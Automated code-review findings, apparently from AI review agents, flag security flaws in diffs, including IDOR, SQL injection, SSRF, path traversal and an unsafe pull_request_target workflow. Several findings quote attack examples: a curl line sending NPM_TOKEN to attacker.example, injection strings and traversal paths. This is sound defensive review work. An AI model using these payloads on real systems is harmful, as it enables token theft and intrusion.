findings.body: tenant_of() decodes the JWT with verify_signature disabled and trusts the tenant_id claim directly. There is no test file in this diff, so there is nothing that would fail if a forged token with an arbitrary tenant_id were passed in, or if signature verification were later (correctly) re-enabled and broke this function's assumptions. Add a test that constructs a token signed with a wrong/unknown key (or unsigned) and asserts what tenant_of() currently returns, so any future change to this trust boundary is visible in test output.

findings.title: Disabling signature verification also disables expiry/audience checks
findings.body: In PyJWT 2.x, turning off `verify_signature` turns off the dependent claim validations (`exp`, `nbf`, `aud`, `iss`) unless each is re-enabled explicitly. So `tenant_of` will happily return a tenant id from a long-expired or wrong-audience token, whereas `claims_for` would raise. Even if the unverified read were intentional, the expiry semantics silently differ between the two functions.

findings.title: Unguarded dict index raises KeyError for tokens without tenant_id
findings.body: A well-formed token that simply lacks a `tenant_id` claim makes line 12 raise a bare `KeyError`, which callers are unlikely to be catching alongside the `jwt.*` exceptions they expect from this module. Return `unverified.get("tenant_id")` with an explicit check, or raise a domain-specific error, so the failure mode is part of the function's contract.

findings.title: Public function `tenant_of()` lacks documentation of its unsafe behaviour
findings.body: The function `tenant_of()` is exported and decodes JWT tokens without signature verification. A caller reading only the function name and signature would not understand that this is intentionally unsafe (to avoid a key lookup), versus accidentally incomplete. Document why verification is disabled, so callers do not assume it verifies the token or attempt to add verification later.

findings.title: Missing ownership check lets any user modify another user's payment method
findings.body:
`update_payment_method` calls `current_user(request)` (authentication only) and then loads `PaymentMethod.get(pm_id)` with the caller-supplied `pm_id`, mutating and saving it with no authorisation check. The neighbouring read handler on line 6 calls `require_owner(current_user(request), pm)`, and `api/auth.py` documents that `current_user` is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`. As written, any authenticated user can enumerate or guess `pm_id` values and overwrite `billing_name` on payment methods belonging to other accounts — a direct IDOR on a billing object.

Fix: add `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, before any mutation. Note also that `user` is currently bound on line 11 and never used, which is a strong hint the check was dropped.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on partial update

findings.title: No test guards missing ownership check on update_payment_method
findings.body: update_payment_method mutates a PaymentMethod loaded by id without calling require_owner (contrast with the adjacent get handler at lines 5-6 which does call it). No test file is included in this diff, so nothing would fail if a user updates another user's payment method. Since the sibling read endpoint has this check and is presumably tested/reviewed for it, an equivalent authorization test for the write path is the missing coverage here.

findings.title: Public endpoint lacks docstring documenting access control
findings.body: The new `update_payment_method` function is a public API endpoint (takes request, pm_id, body as parameters following the pattern of `get_payment_method` above it). A caller needs to know whether ownership is checked before mutation. The function name does not make this clear — `update_payment_method` could plausibly be unsafe or safe. A docstring is needed to document the access control contract, if one exists.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` was previously throttled at 5 requests/hour by the `@rate_limit` decorator; the decorator and its `from limits import rate_limit` import are both deleted, so the function now runs unbounded. The `email` argument is caller-supplied and flows straight into `send_reset_email(email)` with no other guard visible in the diff, which means an unauthenticated caller can drive arbitrary volumes of reset mail: mailbox flooding/harassment of a chosen victim, burning the outbound mail reputation or quota, and cheap enumeration of which addresses produce a reset. It also removes the cost ceiling on brute-forcing reset flows generally.

If the limiter is being moved to middleware or a gateway, that replacement should be visible alongside this change; otherwise restore the decorator (or an equivalent per-IP *and* per-email limit, since a per-IP-only limit does not stop distributed abuse of one victim address).

findings.title: No test guards against removal of rate limiting on password reset
findings.body: The @rate_limit("5/hour") decorator was removed from request_reset, but no test file is included in this diff. If there were a test asserting the endpoint is rate-limited (e.g. checking repeated calls get throttled), it would have caught this regression; absent such a test, this change can ship silently and nothing would fail.

findings.title: read_export_preview skips _confined(), allowing path escape
findings.body:
`read_export_preview` builds its target with `os.path.join(EXPORT_ROOT, name)` and opens it directly. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` resolves outside `EXPORT_ROOT`, and an absolute `name` such as `/etc/passwd` discards `EXPORT_ROOT` entirely. The reader immediately above it (line 14) routes the same parameter through `_confined(name)` first, which is evidently the intended guard for exactly this input. Make the new function call `path = _confined(name)` as well, so both entry points share one confinement check rather than one enforcing it and the other not.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: No test covers path confinement for read_export_preview
findings.body: The new read_export_preview function joins EXPORT_ROOT with an unvalidated name and skips the _confined() normalization used by the sibling handler. No test in this diff exercises this function with a traversal-style name (e.g. '../secret'), so a regression or the existing vulnerability would go unnoticed by the test suite.

findings.title: Undocumented path-handling difference from similar function
findings.body: The function `read_export_preview` is a public API that handles file paths, but provides no documentation explaining its path-handling contract or how it differs from the existing `read_export` function. The preceding function uses `_confined(name)` to normalize and restrict paths, while this new function uses raw `os.path.join()`. Without a docstring or comment explaining this intentional difference, maintainers may incorrectly assume both functions should have identical safety properties, leading to misuse or erroneous refactoring.

findings.title: Public function name does not document input constraints
findings.body: The function name `read_export_preview` does not indicate what kinds of `name` values are acceptable. If this function intentionally accepts arbitrary paths (or paths within a broader scope than `read_export`), that contract should be documented in a docstring. The name alone does not communicate whether `name` is constrained, and callers may pass untrusted input expecting the same confinement as the similarly-named `read_export`.

findings.title: bulk_export no longer enforces tenant ownership on returned reports
findings.body:
`require_owner` was dropped from the import and the per-report loop that called it was deleted. `bulk_export` now fetches every `Report` named in the caller-supplied `report_ids` and serialises it, with no check that the report belongs to `user`'s tenant. Any authenticated user can enumerate or guess report IDs and read another tenant's data. The docstring of `require_owner` states that every cross-tenant object read must go through it, so this is a direct violation of the documented contract. Restore the check — if the loop was the performance problem, do the filtering in the query (e.g. fetch reports scoped by `user.tenant_id`) rather than removing the control.

_Also raised by the security agent:_ Tenant ownership check removed from bulk_export (IDOR)

findings.title: Public endpoint bulk_export lacks contract documentation on access control
findings.body: The bulk_export function is a public endpoint that reads Report objects. It should document whether it enforces ownership checks or allows cross-tenant access. Currently it has no docstring, so callers cannot determine whether the function is safe to call with untrusted report_ids. The auth module docstring states that 'every object read or mutation of another tenant's data must go through' require_owner, making this a critical omission now that the check has been removed.

findings.title: No test guards bulk_export's cross-tenant access control
findings.body: The diff removes the require_owner(user, report) call from bulk_export, eliminating tenant-ownership enforcement. There is no test file in this change, so nothing would fail if a user requested report_ids belonging to another tenant — the function would silently return their data. Add a regression test asserting that bulk_export raises Forbidden (or excludes/blocks) when a requested report belongs to a different tenant than the current user.

findings.title: Unresolved report IDs may now surface as AttributeError on None
findings.body: With the ownership loop gone, nothing iterates over `reports` before serialisation. If `Report.get(rid)` returns `None` for an unknown or deleted ID, `r.to_dict()` on line 7 raises `AttributeError` and the request fails with a 500 instead of a 404/403. Previously the deleted loop would at least have touched each element first (raising in `require_owner` on attribute access). Filter out or explicitly reject missing IDs.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` concatenates `term` and `status` straight into the SQL text:

```python
sql = f"SELECT * FROM customers WHERE name LIKE '%{term}%' AND status = '{status}'"
return execute(sql)
```

Either argument can close the quote and append arbitrary SQL — e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%'; DROP TABLE customers; --"` reaches the cursor unescaped. `execute()` is documented as "Run a parameterised query. `params` must carry every caller value", and it is called here with `params=None`, so nothing downstream escapes anything.

Fix by passing values as parameters, matching `get_customer` one line above:

```python
def search_customers(term, status):
    return execute(
        "SELECT * FROM customers WHERE name LIKE %s AND status = %s",
        (f"%{term}%", status),
    )
```

Note the wildcards belong in the parameter value, not in the SQL literal. If `term` should not allow user-supplied `%`/`_` wildcards, escape them before binding.

findings.title: search_customers calls execute() without params, breaking its contract
findings.body:
`billing.db.execute` documents that "`params` must carry every caller value", and the sibling function `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` instead builds the whole statement by f-string and calls `execute(sql)` with `params` defaulting to `None`, so no value is bound by the driver.

Beyond the contract violation, this is functionally wrong for ordinary inputs: `term="O'Brien"` or `status="a'b"` closes the string literal early and the statement fails to parse, and `term=None` silently searches for the literal text `None`. It is also directly injectable.

Rewrite in the same shape as `get_customer`:

```python
def search_customers(term, status):
    return execute(
        "SELECT * FROM customers WHERE name LIKE %s AND status = %s",
        (f"%{term}%", status),
    )
```

Note the `%` wildcards belong in the bound value, not in the SQL text.

findings.title: No test covers search_customers behaviour
findings.body: search_customers is new, untested code that builds SQL via an f-string instead of using the parameterised execute() pattern shown in get_customer. There is no test in this diff exercising this function, so a regression in its query construction (or the injection risk itself) would not be caught by any test suite.

findings.title: Public function `search_customers` lacks API contract documentation

Given that the function accepts user-facing `term` and `status` parameters, a docstring should document what formats are accepted and any limitations on their content.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS invariant enforced above
findings.body:
The function immediately above establishes the module invariant that a destination URL is only fetched after its host is checked against `ALLOWED_HOSTS` (lines 8-9). `verify_endpoint` takes the same kind of caller-supplied `url` and issues `requests.get` on it with no host parse, no scheme check and no allowlist lookup. A caller that can reach `verify_endpoint` can therefore make the server issue GETs to internal addresses (`http://169.254.169.254/...`, `http://localhost:*/`) or non-HTTP schemes, which is exactly what the check on line 8 exists to prevent. Extract the host-validation from the post path into a shared helper and call it here before the request; also pin `allow_redirects=False`, since a permitted host can redirect to a denied one and `requests` follows redirects by default.

_Also raised by the security agent:_ SSRF: verify_endpoint fetches caller URL with no allowlist or scheme check

findings.title: verify_endpoint has no test coverage for validation behavior
findings.body: verify_endpoint is a new function that performs a server-side GET to a caller-supplied URL with no visible allowlist/scheme check (unlike the sibling function above it which checks ALLOWED_HOSTS). No test file is included in this diff, so there is nothing that would fail if this function were called with an internal/malicious URL, or if the missing validation were later 'fixed' incorrectly. Add a test asserting that verify_endpoint rejects disallowed hosts/schemes the same way the existing post function does.

findings.title: verify_endpoint raises instead of returning a status for unreachable endpoints
findings.body: The name and return shape (`.status_code`) suggest callers treat this as "probe the endpoint and tell me the result". But the only failure mode that produces a return value is an HTTP error response; a DNS failure, refused connection, TLS error or the 5s timeout all raise `requests.exceptions.RequestException` out of the function. For a verification helper whose whole purpose is to probe endpoints that may be down or mistyped, that is the common path, not the exceptional one. Either catch `RequestException` and return a sentinel (e.g. `None`), or document that the function raises so callers wrap it.

findings.title: Public function `verify_endpoint` lacks documentation
findings.body: The function `verify_endpoint(url)` is a public API with an unclear contract. Callers cannot determine from the name and signature alone whether: (1) the URL is validated before fetching (given the security context of this module), (2) what exceptions it raises on invalid URLs or network failures, (3) whether it has the same security restrictions as `send_webhook`, or (4) what status codes are considered success. This is particularly risky given the `send_webhook` function above it validates the URL against an allowlist—a caller might assume `verify_endpoint` does the same, or might not.

findings.title: Public access block fully disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for `acme-customer-invoices`. That is the account-level safety net for this bucket switched off in all four directions: any principal (or misapplied automation) that can call `PutBucketAcl` or `PutBucketPolicy` on it can make customer invoices world-readable, and any pre-existing public ACL will be honoured rather than ignored. The PR description states this bucket is not meant to be public.

Fix: either drop the `aws_s3_bucket_public_access_block.invoices` resource entirely and rely on the account-level block, or declare it with all four attributes set to `true`. The permissive settings appear to have been copied from the `assets` block, where public exposure is intentional.

_Also raised by the correctness agent:_ Invoices bucket copies the public-access-block settings of the public assets bucket

_Also raised by the docs agent:_ Public access block settings contradict intent for invoices bucket

findings.title: Missing explanation for deliberately public assets bucket
findings.body: The assets bucket is configured to allow public access (all public access blocks disabled), but there is no comment explaining why this is intentional. Add a comment to clarify that this bucket is deliberately public and the business reason, to distinguish it from the invoices bucket and prevent accidental modification.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` is a copy of `verify_stripe` except that the final comparison uses `==` rather than `hmac.compare_digest`. Python's `str.__eq__` short-circuits on the first differing byte, so the time taken to reject a forged signature leaks how many leading hex characters were correct. An attacker who can submit repeated webhook deliveries and observe response latency can recover the expected digest byte by byte and then forge arbitrary AcmePay webhooks without knowing `secret`. Change line 12 to `return hmac.compare_digest(expected, header)` to match line 7.

Secondary behavioural difference worth being aware of while you are there: `compare_digest` raises `TypeError` for a `None` or non-string `header`, whereas `==` quietly returns `False`. If any caller relies on the silent-`False` behaviour for a missing header, normalise the header (e.g. `header or ""`) rather than keeping `==`.

_Also raised by the security agent:_ HMAC signature compared with == instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: verify_acmepay is added with no accompanying test. Any correctness test (matching vs mismatching signature) would pass identically whether the comparison used '==' or hmac.compare_digest, so this diff's introduction of a non-constant-time comparison would not be caught by any test that could plausibly be added without specifically checking for timing-safety. Add a test that at least verifies functional correctness, and ideally documents/enforces the requirement that signature comparisons use compare_digest (e.g. via a lint rule or code review checklist), since a black-box test cannot detect the timing side-channel.

findings.title: Exception message and traceback returned in HTTP 500 response
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` and `traceback.format_exc()` into the 500 response. Anything an attacker can do to provoke an unhandled exception — malformed input, a missing record, a DB timeout — now yields file system paths, module and function names, library versions inferable from frame paths, and frequently fragments of SQL, connection strings or other operand values embedded in exception messages (e.g. `psycopg2.OperationalError`, `KeyError` on internal config keys). That is free reconnaissance for shaping a follow-up attack, and in some frameworks local variables or query text appear directly in the exception text.

Keep the client-facing body generic and keep the detail server-side, where `log.exception` on line 8 already records it. If developers need the detail over the wire, gate it on an explicit debug/config flag that is off by default, and consider returning a correlation ID that maps to the log entry:

```python
def handle(exc):
    request_id = ...
    log.exception("request failed", extra={"request_id": request_id})
    return {"error": "internal error", "request_id": request_id}, 500
```

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and yields 'NoneType: None' off the except path

_Also raised by the correctness agent:_ Response body shape/value changed: `error` no longer stable, new `traceback` key

findings.title: Public error response now exposes internals without contract documentation
findings.body: The error response format has changed from `{"error": "internal error"}` to include `{"error": str(exc), "traceback": traceback.format_exc()}`. This is a breaking change to the public API contract (what clients see), but there is no docstring, comment, or documentation explaining what the error handler returns or warning that exception details and stack traces are now exposed. Any documentation or contract specification (OpenAPI spec, README, API docs) describing the error response format is now stale or incorrect. Callers relying on the previous contract will be surprised by the new fields.

findings.title: No test guards against leaking traceback/exception text in error responses
findings.body: The handle() function now returns str(exc) and a full traceback in the client-facing response body. There is no test in this diff (or referenced) that asserts on the shape/content of the returned error payload, so a change like this — which turns a safe generic error message into one that leaks internals — would not be caught by any test suite. Add a test asserting the response body does not contain the raw exception message or 'Traceback' text.

findings.title: Reset path stores unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` returns a bare MD5 hex digest for a user-supplied password, while `hash_password` (line 7) uses bcrypt with a generated salt. Two problems follow:

1. MD5 is unsalted and fast; a stolen store of these digests is recoverable by rainbow table or GPU bruteforce essentially immediately. Any account that goes through a password reset silently downgrades from bcrypt to no meaningful protection.
2. The two functions emit incompatible formats. A verifier built on `bcrypt.checkpw` will reject every reset-path hash (MD5 hex is not a valid bcrypt modular-crypt string), and any verifier that tolerates both must sniff the format — which turns into a downgrade oracle.

The reset path should call `hash_password` (or bcrypt directly with a fresh salt) and produce the same encoding as the normal path. If a short-lived reset *token* digest was the intent rather than a password, that should be a random token compared with `hmac.compare_digest`, not a hash of the user's password.

_Also raised by the security agent:_ Reset-flow passwords hashed with unsalted MD5 instead of bcrypt

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password (and checksum) are new functions added with no accompanying tests in this diff. If hash_reset_password were changed to something even weaker, or broken so it no longer returns a stable/valid hash, nothing would catch it. Given this function handles password reset tokens, a test verifying its output format/stability would at least catch behavioral regressions.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets.*` and a `GITHUB_TOKEN` with write permissions, and it is triggered by pull requests from any fork without maintainer approval. The `with: ref: ${{ github.event.pull_request.head.sha }}` on line 12 replaces the safe default (which checks out the base branch) with the untrusted contributor's commit, and line 13 then executes `./scripts/measure.sh` — a file that comes from that same checkout and is therefore fully attacker-controlled. Line 15 hands `secrets.NPM_TOKEN` directly to that process.

Entry point: the head commit of any fork PR (attacker writes `scripts/measure.sh`, or any file it sources, plus package manifests/hook scripts it may invoke). Sink: the `run` step shell on line 13, executing with the base repo's secret environment and an authenticated `GITHUB_TOKEN`. A one-line change to `measure.sh` (`curl -d "$NPM_TOKEN" attacker.example`) exfiltrates the npm publish token; the ambient `GITHUB_TOKEN` additionally allows pushing to the repository unless `permissions:` is restricted, which this workflow does not do.

Remediation options:
- Revert to `on: pull_request`. The size check needs no secrets from the base repo other than a read-only token, and `pull_request` already gives a checkout of the merge commit in an unprivileged context.
- If a privileged step is genuinely required, split it: a `pull_request` workflow that builds untrusted code and uploads an artifact, plus a `workflow_run`/`pull_request_target` workflow that never checks out fork code and only consumes the artifact.
- At minimum, never combine `pull_request_target` + fork-head checkout + execution of checked-out scripts, and add an explicit `permissions: contents: read` block plus an environment with required reviewers for any secret.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with NPM_TOKEN

findings.title: json.dumps narrows accepted `context` values; hashable-but-not-JSON now raises
findings.body:
The old key `(template_source, tuple(sorted(context.items())))` only required context keys to be sortable and values to be hashable. The new key requires everything in `context` to be JSON-serialisable. Any existing caller passing a `datetime`, `Decimal`, `set`, `UUID`, dataclass or other plain object as a context value — all perfectly legal for a template render and all hashable — will now get an uncaught `TypeError: Object of type X is not JSON serializable` from `cached_render`, before `_render` is ever reached. Non-string dict keys mixed with string keys will also raise during `sort_keys` sorting.

If the digest is wanted, use a serialiser that tolerates arbitrary values (`json.dumps(..., default=repr)`) or fall back to the old tuple key when serialisation fails, so the callable surface of `cached_render` does not shrink.

findings.title: Test only checks `shell=False`, not that argv is a safe list
findings.body: `test_runs_without_a_shell` calls `create_archive` against a `spy` and asserts only `spy.last_call.kwargs["shell"] is False`. It never inspects the positional args (the actual command list) that was passed. A regression that reintroduces shell interpolation while still technically passing `shell=False` — e.g. constructing `["/bin/sh", "-c", f"tar -czf ... {directory}"]` — would satisfy this assertion and pass, even though the underlying injection vulnerability this PR is meant to fix would still be present. The test name promises 'runs without a shell' but the assertion only verifies a flag, not the shape of the command actually executed.

findings.title: `directory` is no longer word-split or glob-expanded by the shell
findings.body: Under the old `shell=True` form, `directory` was interpolated into a shell command line, so a caller could legitimately pass `"/srv/a /srv/b"` (two operands) or `"/srv/data/*"` (a glob the shell expanded). With the list argv, the whole string becomes one literal path operand: tar will report "no such file or directory" and `check=True` turns that into `CalledProcessError`. If any caller relies on multi-path or glob values, this is a hard failure for them rather than a no-op change. Either confirm every call site passes exactly one concrete path, or change the parameter to accept an iterable of directories and splat it into the argv list (`["tar", "-czf", dest, "--", *directories]`).

findings.title: `directory` operand reaches tar unvalidated while `name` is allowlisted
findings.body:
`name` is now constrained by `SAFE_NAME.fullmatch` (line 9), but `directory` flows straight into the tar argv on line 12 with no check. Because it is a list argument after `--`, it cannot be reinterpreted as a shell command or as a tar option, so this is not injection. It is still an arbitrary-path read: a caller that lets a user influence `directory` can make tar archive `/etc`, `~/.ssh` or any other readable tree into `/exports/<name>.tar.gz`, which is presumably a served/downloadable location. Consider resolving `directory` with `os.path.realpath` and asserting it stays under an expected export root, and passing `-C <root>` with a relative operand so symlinked paths inside the tree cannot escape either.

I cannot see the caller of `create_archive` in this diff or in retrieved context, so whether `directory` is attacker-influenced is unverified — that is what the confidence reflects.

findings.title: New ValueError rejects names that previously succeeded (dots, colons, >64 chars)
findings.body: `SAFE_NAME.fullmatch` permits only `[A-Za-z0-9_-]` and at most 64 characters, so names that the old implementation happily accepted — `report.v2`, an ISO timestamp like `2024-01-01T09:30:00` (colons), anything with a space, or a long tenant-prefixed name — now raise `ValueError` instead of producing an archive. That is the right security posture, but it is a new exception type on an unchanged signature and existing callers almost certainly do not catch it. Worth grepping the call sites for name shapes, and consider allowing `.` and `:` (neither is shell- or path-dangerous once slashes and `..` are excluded) or raising the length bound, rather than only tightening.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() and discards the result; it contains no assertion at all, so it cannot fail regardless of what render() returns for an empty invoice. Add an assertion on the actual returned string (e.g. expected empty-line-items formatting).

_Also raised by the correctness agent:_ test_renders_empty_invoice has no assertion

findings.title: Test asserts on mock call_count, not actual rendered output
findings.body:
test_renders_line_items only checks that format_line was called twice; it never checks what render() actually produced. If format_line's output were dropped, concatenated wrong, or mis-ordered in the final string, this test would still pass. Replace with an assertion on the actual return value of render().

findings.title: Deleted test removes coverage for the rounding fix itself
findings.body:
The commit deletes test_rounds_half_to_even, which was the test asserting round_cents(Decimal("2.345")) == Decimal("2.34") (half-to-even rounding). This appears to be exactly the case the PR claims to fix. With this test removed and no replacement added, nothing in the test suite would catch a regression in this rounding behavior going forward. The remaining test_rounds_up_above_half only covers a different case.

findings.title: Patch targets definition site, so real deliver() still runs
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` into the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` continues to call the original object it captured. The test therefore exercises the real `deliver` three times \u2014 it will either make real calls (slow/flaky/network-dependent) or pass only by coincidence if the genuine `deliver` happens to return falsey, and it proves nothing about the give-up-after-three-failures behaviour.

Change the target to `notify.sender.deliver`, matching the existing test on line 2. Consider also asserting the call count (`assert mock.call_count == 3`) so the retry contract is actually verified rather than just the return value.
